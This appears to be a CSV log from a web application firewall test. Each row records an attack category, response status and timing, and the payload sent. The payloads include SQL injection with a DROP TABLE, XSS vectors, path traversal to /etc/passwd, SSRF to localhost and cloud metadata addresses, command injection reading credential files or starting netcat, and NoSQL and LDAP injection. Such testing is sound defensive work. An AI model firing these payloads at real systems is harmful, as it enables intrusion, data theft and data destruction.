Category,Method,Status,Response Time (ms),Payload,Is Redirect,WAF Detected,WAF Type,Timestamp,URL
"SQL Injection","GET",403,215,"WAITFOR DELAY '0:0:5'",false,false,"Unknown","",""
"SQL Injection","GET",200,216,"'%09OR%091=1--",false,false,"Unknown","",""
"SQL Injection","GET",200,218,"' OR 'a'='a",false,false,"Unknown","",""
"SQL Injection","GET",200,221,"1; DROP TABLE notablewaftest17 --",false,false,"Unknown","",""
"SQL Injection","GET",403,224,"' OR SLEEP(5)--",false,false,"Unknown","",""
"SQL Injection","GET",200,227,"' OR '1'='1",false,false,"Unknown","",""
"SQL Injection","GET",200,234,")) OR EXISTS(SELECT * FROM users WHERE username='admin')--",false,false,"Unknown","",""
"SQL Injection","GET",200,239,"'UNION/*!50000SELECT*/1,2,3--",false,false,"Unknown","",""
"SQL Injection","GET",200,243,"' OR 1=1#",false,false,"Unknown","",""
"SQL Injection","GET",200,244,"' OR 1=1--",false,false,"Unknown","",""
"SQL Injection","GET",200,244,"'\u0020OR\u00201=1--",false,false,"Unknown","",""
"SQL Injection","GET",200,248,"%2553%2527%2520OR%25201%253D1",false,false,"Unknown","",""
"SQL Injection","GET",200,258,"0x27204f52203120314431--",false,false,"Unknown","",""
"XSS","GET",200,260,"<script>alert('xss')</script>",false,false,"Unknown","",""
"SQL Injection","GET",200,264,"/**/OR/**/1=1",false,false,"Unknown","",""
"SQL Injection","GET",200,266,"%2527%2520OR%25201%253D1--",false,false,"Unknown","",""
"SQL Injection","GET",200,280,"admin' --",false,false,"Unknown","",""
"SQL Injection","GET",200,282,"' OR 1=1 LIMIT 1;--",false,false,"Unknown","",""
"SQL Injection","GET",200,283,"'/**/OR/**/1=1--",false,false,"Unknown","",""
"SQL Injection","GET",200,286,"' OR 1=1/*",false,false,"Unknown","",""
"XSS","GET",200,142,"<body onload=alert('xss')>",false,false,"Unknown","",""
"XSS","GET",200,145,"<math href=javascript:alert(1)>",false,false,"Unknown","",""
"XSS","GET",200,146,"<iframe src=""javascript:alert('XSS')""></iframe>",false,false,"Unknown","",""
"XSS","GET",200,147,"%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",false,false,"Unknown","",""
"XSS","GET",200,158,"<a href=javascript:alert('xss')>click</a>",false,false,"Unknown","",""
"XSS","GET",200,166,"&#60;script&#62;alert&#40;1&#41;&#60;/script&#62;",false,false,"Unknown","",""
"XSS","GET",200,171,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'",false,false,"Unknown","",""
"XSS","GET",200,175,"<details open ontoggle=alert(1)>",false,false,"Unknown","",""
"XSS","GET",200,176,"<input onfocus=alert(1) autofocus>",false,false,"Unknown","",""
"Path Traversal","GET",200,180,"..\..\..\..\..\..\windows\win.ini",false,false,"Unknown","",""
"XSS","GET",200,181,"javascript:\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029",false,false,"Unknown","",""
"Path Traversal","GET",200,183,"../../../../../../../etc/passwd",false,false,"Unknown","",""
"XSS","GET",200,184,"<marquee onstart=alert(1)>",false,false,"Unknown","",""
"XSS","GET",200,190,"<img src=x onerror=\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029>",false,false,"Unknown","",""
"XSS","GET",200,190,"<ScRiPt>AlErT(1)</ScRiPt>",false,false,"Unknown","",""
"XSS","GET",200,194,"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//""",false,false,"Unknown","",""
"XSS","GET",200,196,"<img src=x onerror=alert('xss')>",false,false,"Unknown","",""
"Path Traversal","GET",200,201,"..%2F..%2F..%2F..%2Fetc%2Fpasswd",false,false,"Unknown","",""
"XSS","GET",200,204,"<svg/onload=alert('xss')>",false,false,"Unknown","",""
"Path Traversal","GET",200,239,"../../etc/passwd",false,false,"Unknown","",""
"Path Traversal","GET",200,123,"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",false,false,"Unknown","",""
"SSRF","GET",200,124,"http://2130706433",false,false,"Unknown","",""
"SSRF","GET",200,125,"http://[::ffff:127.0.0.1]",false,false,"Unknown","",""
"Command Injection","GET",200,127,"; ping -c 10 127.0.0.1",false,false,"Unknown","",""
"Command Injection","GET",200,127,"| cat /etc/passwd",false,false,"Unknown","",""
"SSRF","GET",200,129,"http://[::1]/",false,false,"Unknown","",""
"Command Injection","GET",200,143,"| nc -lvp 4444",false,false,"Unknown","",""
"SSRF","GET",200,153,"http://127.0.0.1/",false,false,"Unknown","",""
"SSRF","GET",200,159,"http://0.0.0.0:80/",false,false,"Unknown","",""
"Command Injection","GET",200,164,"$(cat /etc/passwd)",false,false,"Unknown","",""
"Command Injection","GET",200,165,"| id",false,false,"Unknown","",""
"SSRF","GET",200,165,"http://0177.0.0.1",false,false,"Unknown","",""
"SSRF","GET",200,168,"http://example.com@127.0.0.1/",false,false,"Unknown","",""
"SSRF","GET",200,168,"file:///etc/passwd",false,false,"Unknown","",""
"Command Injection","GET",200,171,"& whoami",false,false,"Unknown","",""
"SSRF","GET",200,175,"http://169.254.169.254/latest/meta-data/",false,false,"Unknown","",""
"SSRF","GET",200,176,"http://127.1",false,false,"Unknown","",""
"Command Injection","GET",200,186,"; ls -la",false,false,"Unknown","",""
"SSRF","GET",200,186,"http://127.0.0.1/latest/meta-data/",false,false,"Unknown","",""
"SSRF","GET",200,187,"http://localhost:80/",false,false,"Unknown","",""
"NoSQL Injection","GET",200,82,"{'$gt':''}",false,false,"Unknown","",""
"SSRF","GET",200,103,"d0vjq03vq99i18n2rq6gaw9riihcum3it.oast.live",false,false,"Unknown","",""
"Local File Inclusion","GET",200,143,"index.php%00.jpg",false,false,"Unknown","",""
"NoSQL Injection","GET",200,144,"{""$ne"":null}",false,false,"Unknown","",""
"LDAP Injection","GET",200,145,"*)(|(uid=*))",false,false,"Unknown","",""
"NoSQL Injection","GET",200,146,"{""username"": {""$ne"": null}, ""password"": {""$ne"": null}}",false,false,"Unknown","",""
"NoSQL Injection","GET",200,152,"{""$or"": [{}, {}]}",false,false,"Unknown","",""
"Open Redirect","GET",200,155,"//evil.com",false,false,"Unknown","",""
